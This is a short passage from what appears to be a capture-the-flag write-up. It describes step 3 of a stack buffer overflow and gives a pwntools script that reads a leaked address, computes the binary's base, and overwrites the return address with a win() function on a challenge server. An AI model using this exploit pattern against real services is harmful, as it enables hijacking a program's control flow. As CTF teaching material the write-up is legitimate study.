03 Step 3 Overflow the buffer & overwrite RIP ▼

No canary → overflow freely. Overwrite RIP with the calculated win() address.
# Python exploit skeleton
from pwn import *

r = remote('challenge.flagvault.local', 9005)
leak = int(r.recvline_contains(b'Leak').split()[-1], 16)
base = leak - 0x1269
win = base + 0x11e9

payload = b'A' * 72 + p64(win)
r.sendline(payload)
r.interactive()
